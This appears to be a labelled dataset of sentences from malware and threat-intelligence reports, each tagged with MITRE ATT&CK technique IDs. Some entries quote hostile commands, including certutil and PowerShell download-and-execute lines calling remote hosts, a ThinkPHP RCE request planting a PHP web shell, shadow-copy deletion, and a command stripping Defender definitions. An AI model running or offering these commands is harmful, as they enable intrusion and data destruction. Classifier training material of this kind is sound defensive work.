Unpacks the code in memory via process hollowing	['T1055.012']
The specific sandbox checks include:  Using WMI to check BIOS version (SMBIOSBIOSVERSION) for VBOX, bochs, qemu, virtualbox and vm	['T1497.001', 'T1497']
Mouse Pointer Check The Trojan will perform the following WMI query:   Select * from Win32_PointingDevice   The Trojan will check the Caption, Description, HardwareType, InfSection, Manufacturer and Name fields in the results for the string VMware, Virtual, VBox, VM or Oracle	['T1497.001', 'T1497']
The OopsIE payload checks to see if the result of this query as more than 0 elements to determine if it is running on a virtual machine	['T1497.001', 'T1497']
Microphone, Voice IP applications	['T1123']
After the encryption of file, it will delete shadow copies with the command “ vssadmin delete shadows /all ” to ensure that all the data cannot be restored easily.	['T1485']
Once encrypted, the system information is sent in the body of an HTTP POST	['T1486']
MS\d{2}-\d{3}	['T1210']
HKCU\Software\Microsoft\Office test\Special\Perf	['T1137']
VPN and to persist in same sentence	['T1133']
C:\Windows\System32\utilman.exe	['T1546.008']
!ExeCuteFile Executes a specified file using ShellExecuteA   !DeleteFileFolder Deletes a file or a folder   !SendkeyLogToServer Uploads the %TEMP%\Save.tmp file to the C2 server   !DeleteKeyloggerLog Deletes the %TEMP%\Save.tmp file on the system    Table 2 Commands available within MPK IRC Bot   The post Magic Hound Campaign Attacks Saudi Targets appeared first on Palo Alto Networks Blog	['T1070.004', 'T1074']
^testmode Runs the test function to determine which DNS query types can successfully communicate with the C2   ^showconfig Creates a pipe delimited (“|”) string that contains the sample’s settings, including the list of C2 domains and available DNS query types	['T1071', 'T1008']
10 Ensuring the files have been downloaded After the malware is downloaded and files verified, the script will check in the C:\Program Files\ directory for the presence Avast antivirus, which happens to be the most common installed AV worldwide	['T1083', 'T1105']
25 26 ix32.dll ix64.dll LoadLibrary call template dll is used by Reinstaller/Injector plugin (rsXX.dll) for injecting LoadLibrary call into running processes	['T1055', 'T1574.002']
Additionally, the first stage JavaScript creates a scheduled task that executes the second stage code within a minute – this delayed execution helps to bypass behavior analysis since the second stage is not directly executed by the first stage	['T1053.005', 'T1074', 'T1064', 'T1027']
All subsequent messages are encrypted with AES in CBC mode	['T1573', 'T1027']
Analyzing Gold Dragon As part of its initialization, Gold Dragon:  Builds its imports by dynamically loading multiple APIs from multiple libraries Gains debug privileges (“SeDebugPrivilege”) for its own process to read remote memory residing in other processes  The malware does not establish persistence for itself but for another component (if it is found) on the system:  The malware begins by looking for an instance of the Hangul word processor (HWP) running on the system	['T1055', 'T1057']
An example of 1.hwp with registry and system information:  Gold Dragon executes these steps executed in the exfiltration process:  Once the malware has gathered the required data from the endpoint, it encrypts the data file 1.hwp using the password “www[dot]GoldDragon[dot]com” The encrypted content is written to the data file 1.hwp	['T1074', 'T1486']
A number of commands are provided to the attackers, including the ability to download and execute additional information, upload documents of interest, and take screenshots of the desktop	['T1113', 'T1105']
Available Commands The XAgent C2 server will provide commands for the Trojan to run on the compromised system within its response to inbound HTTP request	['T1071', 'T1059']
Buckeye has been known to exploit zero-day vulnerabilities in the past, such as CVE-2010-3962 in an campaign in 2010 and CVE-2014-1776 in 2014	['T1068', 'T1203']
Building a client    Build configuration Usage scenario Description     Debug configuration Testing The pre-defined Settings.cs will be used, so edit this file before compiling the client	['T1562.001', 'T1027']
Command  Action    sign  Requests system information    settings  Requests settings from C2 server    logs  Uploads harvested passwords    wallet  Uploads harvested cryptocurrency wallet data    proxy  Indicates SOCKS proxy port opened    miner  Cryptocurrency miner commands    error  Reports errors to C2 server    ddos  DDoS attack commands    Table 1: Zyklon accepted commands The following figures show the initial request and subsequent server response for the “settings” (Figure 13), “sign” (Figure 14), and “ddos” (Figure 15) commands	['T1090', 'T1059']
Command Description   search Searches for corresponding files   search&upload Encrypts and adds the corresponding files to the upload directory with the provided name   uploadfile Encrypts and adds the specified file to the upload directory with the provided name   uploadfolder Encrypts and adds the mentioned directory to the upload directory with the provided name   shellexecute Silently executes received command with cmd.exe   wmic Silently executes received command with wmic.exe (for WMI commands)   sendIEPass Encrypts and adds all gathered browser data into files for upload to C2   uninstall Removes files, directory and BITS tasks    Cryptography To decrypt the configuration data, the malware uses XOR with 25-character keys such as “waEHleblxiQjoxFJQaIMLdHKz” that are different for every sample	['T1047', 'T1070.006', 'T1036', 'T1083', 'T1074', 'T1486']
Command Hash   Command Name   Description    0x0AA37987  loadconfig  Runs each command specified in the configuration file (see the Configuration section)	['T1070.006', 'T1016']
Comnie, first named by Sophos seemingly after the Windows LNK file name it created, is a custom malware family that is used in targeted attacks, and has been observed in the wild since at least April 2013	['T1036', 'T1547.009']
Creates the service file /usr/lib/systemd/system/rsyncd.service [Unit]Description= synchronize and backup service.After=syslog.target [Service].ExecStart=/bin/rsyncd.OOMScoreAdjust=-500 [Install].WantedBy=multi-user.target Then it installs the service by executing the following commands: ln -s '/lib/systemd/system/rsyncd.service' '/etc/systemd/system/multi-user.target.wants /rsyncd.service' systemctl daemon-reload  The running systemd process determines, which option will be used to register the Trojan in autorun	['T1007', 'T1543.003', 'T1021', 'T1102', 'T1569.002']
Deletion of all registry keys associated with the extraction of the SFX RAR Deletion of the User Assist Key entries related to applications that have been recently executed Deletion of all registry keys relating to services that have recently run  Clearly the attacker using this PlugX is paranoid about it being detected on disk, both in the registry and the file system	['T1112', 'T1547.001', 'T1012']
Encrypted backdoor configuration    Description Decryption Strings   Check code MDDEFGEGETGIZ   Addr1: tel.qpoe[.]com   Addr2: elderscrolls.wikaba[.]com   Addr3: tel.qpoe[.]com   Port1: 443   Port2: 443   Port3: 53   LoginPasswd: someone   HostMark: mark   Proxy: 0    Figure 12	['T1140', 'T1027', 'T1043']
Exploit Analysis  Despite being an older vulnerability, many threat actors continue to leverage CVE-2012-0158 to exploit Microsoft Word	['T1068', 'T1203']
Exploits  CVE-2017-0143, SMB exploit CVE-2017-0146, SMB exploit  These 2 exploits are EternalBlue/Doublepulsar and are used to drop the Stage1 Dropper onto a system.  Installation The Gh0stRAT dropper arrives on a PC through the use of EternalBlue/DoublePulsar.  Once on a victim’s PC, the dropper executable is launched and it decrypts and loads the Gh0stRAT DLL into memory.  It then passes the config buffer to the extracted DLL and calls the exported function (Shellex)  [Screenshot 2] The mainthread of the code.  Note the call at the bottom that calls Shellex Gh0stRAT dll functionality An important note:  In its base state, this sample is damaged, therefore it will not install its services properly.  However, as the service information is included, I will list it anyways.  Additionally, samples downloaded from its distribution server DO install correctly,  and are downloaded during the base dll’s runtime	['T1574.001', 'T1574.002', 'T1203']
Figure 12: DrAGon_MidDLe stores the list of proxy URLs used to interact with C2 server Section 2 The second section of the PowerShell script has the ability to perform encryption and decryption of messages that are exchanged between the system and the C2 server	['T1573', 'T1090']
Figure 2: APT39 attack lifecycle There are some indications that APT39 demonstrated a penchant for operational security to bypass detection efforts by network defenders, including the use of a modified version of Mimikatz that was repacked to thwart anti-virus detection in one case, as well as another instance when after gaining initial access APT39 performed credential harvesting outside of a compromised entity's environment to avoid detection	['T1070.004', 'T1027.002']
The ‘Company’ field in this case, contains the raw command that the attacker wishes to run, downloading and executing the next stage of the malware. Delivery via HTA Loader. In this case the attackers sent an HTML Application file (.hta) to targets most likely as an email attachment	['T1053.005', 'T1106', 'T1010', 'T1074', 'T1547.001']
Figure 4: Execution Workflow Section of v.vbs After successful execution of the steps mentioned in the Execution Workflow section, the Task Scheduler will launch GoogleUpdateschecker.vbs every minute, which in turn executes the dUpdateCheckers.ps1 and hUpdateCheckers.ps1 scripts	['T1053.005', 'T1106', 'T1064']
Figure 8 CARROTBAT downloading final payload via certutil   The downloaded CAB file has the following properties:    MD5 a943e196b83c4acd9c5ce13e4c43b4f4   SHA1 e66e416f300c7efb90c383a7630c9cfe901ff9fd   SHA256 cfe436c1f0ce5eb7ac61b32cd073cc4e4b21d5016ceef77575bef2c2783c2d62   File Type Microsoft Cabinet archive data, 181248 bytes, 3 files      The following three files and their descriptions are dropped by this CAB file:      Filename Purpose   Install.bat Installation batch script responsible for copying the other files to C:\Users\Public\Downloads and setting the Run registry key to ensure persistence	['T1036', 'T1083', 'T1064', 'T1105']
Figures 8 and 9: LiteHTTP screenshots taken from the user`s profile in which the acronym “Knock” appears Conclusion SpeakUp`s obfuscated payloads and propagation technique is beyond any doubt the work of a bigger threat in the making	['T1113', 'T1027']
First, we had not seen the CPU fan check used before, and upon testing the WMI query in a VMware Windows 7 virtual machine we saw no result, as seen in Figure 1  Figure 1 WMI query for the Win32_Fan class on a VM returning no statistics However, when we ran the same query in a physical system running Windows 7, we saw the contents of the Win32_Fan class, as seen in Figure 2	['T1047', 'T1497']
For example, we can see it will inject itself to one these three processes:  %ProgramFiles(x86)%\Sophos\AutoUpdate\ALUpdate.exe %ProgramFiles(x86)%\Common Files\Java\Java Update\jusched.exe %ProgramFiles(x86)%\Common Files\Adobe\ARM\1.0\armsvc.exe  The attempt to inject itself into a process belonging to antivirus product suite is particularly bold	['T1036', 'T1055']
For instance, the following 15 bytes were used to generate an HTTP parameter during our analysis:    Random Value Constant Value agent_id   0F EE C8 83 56 0E 9F F0 EB 98 43 30 30 30 30    The resulting ciphertext is then encoded using XAgent’s base64 encoding routine that starts by building the following encoding alphabet: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_ As you can see, this is not the standard base64 alphabet, rather it is the “URL and Filename safe” Base 64 Alphabet from RFC 4648, as the “+” in the standard alphabet is replaced with “-” and the “/” replaced with “_”	['T1027', 'T1132']
GET /<string>/<5 digit number>/<4 character string>.php?<first 3 characters of last string>_id=<43 character string>= HTTP/1.1 Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */* User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E) Host: <C2 Location> Cache-Control: no-cache    Figure 6: Sample GET request for WATERSPOUT backdoor Although there are no current infrastructure ties to link this backdoor to APT12, there are several data points that show a possible tie to the same actors:  Same initial delivery method (spear phishing email) with a Microsoft Word Document exploiting CVE-2012-0158	['T1010', 'T1008']
HawkEye offers the following exfiltration options based on the configuration: email, FTP, SFTP, HTTP POST to PanelURL API or ProxyURL.As mentioned above, in the comments of the main loop section, it also comes with several anti-analysis features, including starting an anti-debugging thread or disabling certain AV-related programs via the Image File Execution Options (IFEO) evasion technique by registering invalid debuggers that redirect and effectively disable various system and security applications.The following diagram summarizes the full infection process:ConclusionRecent changes in both the ownership and development efforts of the HawkEye Reborn keylogger/stealer demonstrate that this is a threat that will continue to experience ongoing development and improvement moving forward	['T1562.001', 'T1071']
Hijack Clipboard Bitcoin Address Zyklon has the ability to hijack the clipboard, and replaces the user’s copied bitcoin address with an address served up by the actor’s control server	['T1115', 'T1016']
If running with administrator privileges on a 32-bit host:  Copy the temporary DLL in %TEMP% to %WINDOWS%\LINKINFO.dll   Otherwise:  Copy the temporary DLL in %TEMP% to %APPDATA%\cnagnt.dll Delete the temporary DLL in %TEMP% Write a ‘Conime.lnk’ file in the user’s startup path	['T1055', 'T1574.001', 'T1070.004', 'T1574.002']
In each iteration of the communications loop, the Trojan will check to see if the modification time of the first file changed, and if it is not updated the Trojan will update the second file by writing the string b<unique identifier>c<5 random lowercase characters>.<C2 domain> to the file by creating an HTTP POST request to a URL structured as follows: <Google Drive URL in ‘gdue’> + <second file identifier> + “?supportsTeamDrive=true&uploadType=resumable&fields=kind,id,name,mimeType,parents” In one RogueRobin sample (SHA256: f1b2bc0831…), the author did not use the Google Drive URL provided by the actor when issuing the x_mode command, and instead included a  hardcoded Google Drive URL, as seen in Figure 6	['T1102', 'T1105']
In most lures, one scheduled task persisted an APT32-specific backdoor and the other scheduled task initialized a commercially-available backdoor as backup	['T1053.005', 'T1036']
It can be used to execute files as a different user, move, and delete files locally, schedule remote AT jobs, perform host discovery on connected networks, scan for open ports on hosts in a connected network, and retrieve information about the OS, users, groups, and shares on remote hosts	['T1087', 'T1046']
It has the following command line argument help: info  <Server/Domain> [options] [options]:   -d Domain   -o OsInfo   -t TsInfo   -n NetuseInfo   -s ShareInfo ShareDir   -c Connect Test   -a Local And Global Group User Info   -l Local Group User Info   -g Global Group User Info   -ga Group Administrators   -gp Group Power Users   -gd Group Domain Admins   -f <infile> //input server list from infile, OneServerOneLine info <\\server> <user> ChromePass: A tool from NirSoft used for recovering passwords stored in the Chrome browser	['T1069', 'T1087']
It then uses the base64 encoding function with this alphabet to encode the data, which in the above case resulted in: D-7Ig1ngV3PkdouzP974 The Trojan then creates a string of 9 random symbols and appends the encoded ciphertext to this random string	['T1573', 'T1027', 'T1132']
Once connectivity to the service provider IP was verified, the actor established the service provider IP as a proxy for the victim’s SOGU backdoor	['T1543.003', 'T1016', 'T1090']
Once Shellex is called, it first passes each of the items in the config buffer to their own strings.  Next, it creates a mutex using the filename and checks to see if the Service key for the service name exists.  If so, it opens it using service manager.  If not, it first saves a copy of itself to %Program Files (x86)%/DIFXE/svchost.exe.  Next, it creates the service and runs it.  Once the service is running, it creates a new mutex using [C2URL]:[PORT] and connects to the C2 server.  It then sends the Implant_Heartbeat opcode, and then calls its payload function to grab  Version Information (x86 and x64) Host information SystemInfo Processor Count and Write Speed Global Memory Status  before formatting it, altering the InstallTime subkey, and sending all of the information back to its C2 in the Implant_Login buffer	['T1082', 'T1543.003', 'T1569.002']
Once the QUADAGENT payload has executed, it will use rdppath[.]com as the C2, first via HTTPS, then HTTP, then via DNS tunneling, each being used as a corresponding fallback channel if the former fails	['T1071', 'T1008']
One sample in particular, cba5ab65a… used yet another unique user agent string in combination with the previous user agent for its C2: Mozilla v5.1 (Windows NT 6.1; rv:6.0.1) Gecko/20100101 Firefox/6.0.1 A malware sample using two separate unique user agent strings is uncommon	['T1033', 'T1543.001']
Otherwise, the Server will respond with a command followed by a set of parameters, split up by the delimiter <>:[command]<>[parameters for command in hexadecimal format] The available commands are: Command Description 1 Run command 2 Upload a file 3 Download a specified file   The parameters for each command are issued in hexadecimal format	['T1070.006', 'T1016', 'T1059', 'T1105']
Palo Alto Networks customers are protected from this OilRig attack campaign and OopsIE by:  AutoFocus customers can track this Trojan with the OopsIE tag All known OopsIE samples are marked with malicious verdicts in WildFire All known OopsIE C2 domains have DNS signatures and are classified as Command and Control    Indicators of Compromise OopsIE Trojan 36e66597a3ff808acf9b3ed9bc93a33a027678b1e262707682a2fd1de7731e23 055b7607848777634b2b17a5c51da7949829ff88084c3cb30bcb3e58aae5d8e9 6b240178eedba4ebc9f1c8b56bac02676ce896e609577f4fb64fa977d67c0761 9e8ec04e534db1e714159cc68891be454c2459f179ab1df27d7f89d2b6793b17  OopsIE C2 defender-update[.]com windowspatch[.]com The post OilRig Targets a Middle Eastern Government and Adds Evasion Techniques to OopsIE appeared first on Palo Alto Networks Blog	['T1071', 'T1008']
Query attempts to detect VirtualBox environment from the win32_BIOS WMI class.   Query attempts to detect Bochs environment from the win32_BIOS WMI class.   Query attempts to detect QEMU environment from the win32_BIOS WMI class.   Query attempts to detect VirtualBox environment from the win32_BIOS WMI class.   Query attempts to detect VMWare environment from the win32_BIOS WMI class.   Query attempts to detect Xen environment from the win32_BIOS WMI class.   Uses this query to check the system information for the string “VMware”	['T1047']
Russia Ukraine Poland Lithuania Belarus Azerbaijan Kyrgyzstan Kazakhstan Iran Israel Turkey Libya Kuwait Taiwan Vietnam India Croatia Germany Belgium Sweden  Victim profiles point to an expansive interest in ICS:  power generation site owners power facilities construction power generation operators large suppliers and manufacturers of heavy power related materials investors  However, we also noticed that the target list includes government, property holding, and technology organizations as well:  high level government other ICS construction federal land holding agencies municipal offices federal emergency services space and earth measurement and assessment labs national standards body banks high-tech transportation academic research  Victim cases We gained insight into significant BE2 victim profiles over the summer of 2014	['T1007', 'T1083']
Several Mandiant investigations revealed that, after gaining access, APT32 regularly cleared select event log entries and heavily obfuscated their PowerShell-based tools and shellcode loaders with Daniel Bohannon’s Invoke-Obfuscation framework	['T1070', 'T1027']
Socks5 Proxy Zyklon features the ability to establish a reverse Socks5 proxy server on infected host machines	['T1016', 'T1090']
Stage 1 sample file: 3amadi_hamas.zip MD5: e686ffa90b2bfb567547f1c0dad1ae0b Type: Compressed container Child file/lure name: محضر اجتماع العمادي مع هنية رئيس حماس امس الاحد .exe Child file/lure MD5: 92dd0f16e8ae274d83ba1d0d5b2e342  This sample ZIP file, which is similar to many other stage 1 downloaders in this campaign, contains an executable that is a compiled AutoIt script and which embeds some interesting functions (listed in the table below)	['T1036', 'T1083', 'T1074']
Takes screenshots when recording VoiceIP app audio	['T1113', 'T1123']
"The adversaries can get detailed information about the victim's machine, as you can see in the screenshot below.Beside the system information, it steals passwords from common web browsers, Filezilla, Beyluxe Messenger, CoreFTP and the video game ""Minecraft."" It also starts a keylogger, steals clipboard content, takes screenshots from the desktop and pictures from the webcam"	['T1113', 'T1003', 'T1082', 'T1125']
The built-in Windows utility rundll32.exe is then used to load this DLL by the original .lnk file	['T1218.011', 'T1547.009']
"The DDE instructions attempt to run the following the following command on the victim host, which attempts to download and execute a payload from a remote server:       C:\\Programs\\Microsoft\\MSOffice\\Word.exe\\..\\..\\..\\..\\Windows\\System32\\rundll32.exeC:\\Windows\\System32\\shell32.dll,ShellExec_RunDLLC:\\Windows\\System32\\cmd.exe /k certutil -urlcache -split -fhxxp://220.158.216[.]127/MScertificate.exe & MScertificate.exe""     During our analysis, we observed this DDE downloading and executing a Zebrocy AutoIt downloader (f27836430…), configured to attempt to download an additional payload from 220.158.216[.]127"	['T1036', 'T1105']
The exploitation is issued in three steps:  Exploiting CVE-2018-20062 for uploading a PHP shell  Using a GET request, a remote command execution vulnerability in ThinkPHP (CVE-2018-20062) is sent to the targeted server, as shown below: s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo ^<? php $action = $_GET[‘module’];system($action);? ^>>index.php This shell executes commands sent via the “module” parameter in a query	['T1059', 'T1203']
The fact that the actor used Metasploit shellcode within the Unicorn generated PowerShell script leads us to speculate that the ultimate payload of this attack is Meterpreter, which is a shellcode-based payload	['T1064', 'T1059.001']
The file will be inflated in order to retrieve a RTF document, this document will be displayed to the infected user by executing Wordpad.Here is the PDB path from the PoohMilk sample:E:\BIG_POOH\Project\milk\Release\milk.pdbFreenki SampleThe purpose of Freenki is to collect information on the infected system and to download a third executable	['T1082', 'T1105']
The full obfuscated command inside the .lnk file	['T1547.009', 'T1027']
The keylogger will monitor for active application windows and write them to the log in the following format: <span class=’keylog_process’>[Application Name]</span> The keylogger will log a configurable amount of keystrokes (default 50) before sending the log to the C2 server using the following format: <span class=’keylog_user_keys’>[logged keystrokes]</span> The keylogger can handle logging special keys, such as return and the function keys and will report those within the log in the following format; <span class=’keylog_spec_key’>[special character]</span> Infrastructure The XAgentOSX sample we analyzed was configured to use the following IP address and domain names as its C2 servers: 23.227.196[.]215 apple-iclods[.]org apple-checker[.]org apple-uptoday[.]org apple-search[.]info When we analyzed this sample, the domain names that were used as backup C2 locations were not registered; therefore, these domains did not provide any links to additional infrastructure	['T1573', 'T1056']
"The macro performs all of these activities with the following command:cmd /c taskkill /f /im winword.exe&taskkill /f /im Excel.exe&taskkill  /f /im MSPUB.exe&taskkill /f /im POWERPNT.EXE&taskkill /f /im  MSASCuiL.exe&taskkill /f /im MpCmdRun.exe&cd """"%ProgramFiles%\Windows  Defender"""" & MpCmdRun.exe -removedefinitions -dynamicsignatures & exitThe macro also attempts to deactivate security mechanisms within Microsoft Office products by modifying the registry"	['T1055.012', 'T1036', 'T1112']
The mechanism for downloading additional components is based on the Computer Name and UserName of the endpoint provided by the malware process to the control server in the following HTTP GET request: GET http://ink[dot]inkboom.co.kr/host/img/jpg/download.php?filename=<Computer_Name>_<username>&continue=dnsadmin After successfully retrieving the component from the control server, the next-stage payload is copied to the Application Data directory of the current user and executed: C:\DOCUME~1\<username>\APPLIC~1\MICROS~1\HNC\hupdate.ex (note “ex,” not “exe”)  The capability to download additional components from the control server	['T1033', 'T1105']
The plugin URL is stored in file in following format:  /plugin/index.php?plugin=<Plugin_Name>  The following plugins are found in the memory of the Zyklon malware:  /plugin/index.php?plugin=cuda /plugin/index.php?plugin=minerd /plugin/index.php?plugin=sgminer /plugin/index.php?plugin=socks /plugin/index.php?plugin=tor /plugin/index.php?plugin=games /plugin/index.php?plugin=software /plugin/index.php?plugin=ftp /plugin/index.php?plugin=email /plugin/index.php?plugin=browser  The downloaded plugins are injected into: Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe	['T1027.002', 'T1068']
The Trojan will respond to the C2 to notify it of a successful upload by sending a URL structured as follows:http://<c2 domain>/resp?<hex(Environment.UserName/Environment.MachineName)>AAZ<hex(“File Uploaded”)> The download command (3) reads the contents of a specified file and sends the data to the C2 server	['T1071', 'T1105']
The Trojan will respond to the C2 with “PRIVMSG <username> : <message> [<specified path>]”	['T1033']
"The webpage contained both CVE-2014-6332 exploit code and a VBScript that invoked PowerShell on the affected users’ system to download the below payload:     function runmumaa()     On Error Resume Next     set shell=createobject(""Shell.Application"")     shell.ShellExecute ""powershell.exe"",""-NoLogo -NoProfile                 -NonInteractive -WindowStyle Hidden ( New-Object                         “System.Net.WebClient”).DownloadFile(“http://www.playboysplus.com        /install/install.exe”,”install.exe”);Invoke-Item install.exe"", """",         ""open"", 1     end function The CVE-2014-6332 exploit code seen in this incident is derived from the code published at http://www.exploit-db.com/exploits/35230/, which has also been incorporated in the Metasploit project"	['T1055.012', 'T1036', 'T1068']
The webshell will iterate through the IP list and perform a series of commands for each IP, starting off with using the following command to connect to the remote system: net use [IP address] /user:[domain admin username] [domain admin password] 2>&1 After connecting to the remote system with net use, the webshell will run the following command to obtain a list of user folders: dir /b [IP address]\c$\Users 2>&1 With a list of user folders, the webshell will iterate through the list of users and enumerate all of the files in the following folders: [IP address]\c$\Users\[username]\Desktop [IP address]\c$\Users\[username]\Documents [IP address]\c$\Users\[username]\Downloads The Network Downloader function will gather all the files in these folders and use 7-Zip to compress and archive the files	['T1033', 'T1016', 'T1087', 'T1204']
They consist mainly of persistence mechanisms and simple instructions despite their different forms (VBS scripts, PowerShell scripts, known software with open source code that can be backdoored, and in-house built dotnet apps)	['T1064', 'T1547.001']
They utilised Windows commands in order to enumerate and conduct reconnaissance activities such as tasklist.exe, ping.exe, netstat.exe, net.exe, systeminfo.exe, ipconfig.exe and bcp.exe	['T1055.012', 'T1036']
"This version of HALFBAKED connects to the following C2 server: hxxp://198[.]100.119.6:80/cd hxxp://198[.]100.119.6:443/cd hxxp://198[.]100.119.6:8080/cd This version of HALFBAKED listens for the following commands from the C2 server:  info: Sends victim machine information (OS, Processor, BIOS and running processes) using WMI queries processList: Send list of process running screenshot: Takes screen shot of victim machine (using 58d2a83f777688.78384945.ps1) runvbs: Executes a VB script runexe: Executes EXE file runps1: Executes PowerShell script delete: Delete the specified file update: Update the specified file  All communication between the backdoor and attacker C2 are encoded using the following technique, represented in pseudo code: Function send_data(data)                 random_string = custom_function_to_generate_random_string()                 encoded_data = URLEncode(SimpleEncrypt(data))                 post_data(""POST”, random_string & ""="" & encoded_data, Hard_coded_c2_url, Create_Random_Url(class_id)) The FireEye iSIGHT Intelligence MySIGHT Portal contains additional information based on our investigations of a variety of topics discussed in this post, including FIN7 and the HALFBAKED backdoor"	['T1070.004', 'T1041']
UAC bypass via DLL hijacking requires:  A Windows executable with the auto-elevate property in its manifest A Windows executable in a secure directory (%systemroot%\system32)  The malicious NTWDBLIB DLL performs the simple task of setting up the malicious ipnet.dll as a service by running one of the two batch files contained in the CAB file (which is also dropped to %systemroot%\system32):  NTWDBLIB executing the installer batch files under the context of cliconfg.exe.  The batch files involved in the attack modify the system service COMSysApp to load the malicious ipnet.dll	['T1055', 'T1548.002']
We are not sure if this works, but the command name would suggest it is meant to take a screenshot   $command Runs a PowerShell command and sends the output to the C2   slp:\d+ Sets the sleep interval between C2 beacons   $testmode Issues DNS queries of A, AAAA, AC, CNAME, MX, TXT, SRV and SOA types to the C2 servers attempting to determine which DNS query types were successful	['T1071', 'T1571', 'T1008', 'T1043']
When macros are enabled and run, the macro within the Word document searches the sections of the document to get the contents of the header using the following piece of code:       Set rng = ActiveDocument.Sections(intSection).Headers(1).Range     The code above obtains the contents of the header, which the macro will write to a file at C:\programdata\Office365DCOMCheck.ps1	['T1140', 'T1083', 'T1204']
